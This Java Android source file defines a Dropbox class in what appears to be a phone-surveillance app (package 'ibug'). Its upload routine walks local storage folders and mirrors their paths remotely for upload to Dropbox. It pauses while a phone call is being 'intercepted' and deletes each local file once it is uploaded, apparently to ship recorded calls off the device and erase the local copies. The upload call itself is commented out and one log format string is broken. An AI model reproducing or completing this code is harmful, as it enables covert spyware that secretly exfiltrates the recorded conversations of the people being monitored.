package com.ibug.misc;

import java.io.File;
import android.util.Log;
import android.content.Context;
import com.ibug.IAnnotations.*;
import com.ibug.call.RecordManager;

import static com.ibug.misc.Utils.Tag;
import static com.ibug.misc.Utils.getRootStorage;

public class Dropbox implements DropBoxTask {

    public static boolean isUploading;

    private final Context context;

    private final UploadTask task;

    @Constructor
    public Dropbox(Context _context) {
        context = _context;
        task = new UploadTask(context);
    }

    @StartMethod
    @Override
    public void download(File... localFileDirectory) throws Exception {

    }

    @SuppressWarnings("ConstantConditions")
    @StartMethod
    @Override
    public void upload(File... directories) throws Exception {
        isUploading = true;
        if( directories != null )  {
            for ( File directory: directories ) {
                if (directory == null) continue;
                if (!directory.isDirectory()) continue;
                if (directory.list().length <= 0) continue;

                for (String filename : directory.list()) {
                    /*
                    ** stop upload when phone call intercept
                    */
                    if (RecordManager.Flag) break;
                    /*
                    ** prepare file path
                    */
                    String local = Path.local (directory, filename);
                    String remote = Path.remote (directory, filename);
                    /*
                    ** check if local file is locked i.e.
                    ** being written to at the moment.
                    ** #logic - try renaming the file
                    */
                    File currentFile = new File(local);

                    if (currentFile.renameTo(currentFile)) {
                        /*
                        ** upload file to drop-box
                        */
                        UploadTask device = new UploadTask (context);
                        // device.upload(local, remote, this::uploadAndFinish );
                    }

                }

            }

        }

        isUploading = false;

    }

    private void uploadAndFinish (File uploaded_file, long uploaded_size) {
        long size = uploaded_file.length();
        String path = uploaded_file.getAbsolutePath();
        if (size == uploaded_size) {
            Log.d(Tag, String.format (
                "{upload size : size, uploaded file : %s, status : uploaded successfully}", size, path)
            );
            uploaded_file.delete();
            return;
        }

        Log.d(Tag, String.format("(%s of %s) uploading...", uploaded_size, size));

    }

    @InnerClass
    private static class Path {

        static String local (File parentDirectory, String filename) {
            File local = new File (parentDirectory, filename);
            return local.getAbsolutePath();
        }

        static String remote (File parentDirectory, String filename) {
            File localRoot = getRootStorage();
            String localRootPath = localRoot.getAbsolutePath();
            String parentDirPath = parentDirectory.getAbsolutePath();
            String remotePath = parentDirPath.replace(localRootPath, "");
            File remoteFilePath = new File (remotePath, filename);
            return remoteFilePath.getAbsolutePath();
        }

    }


}
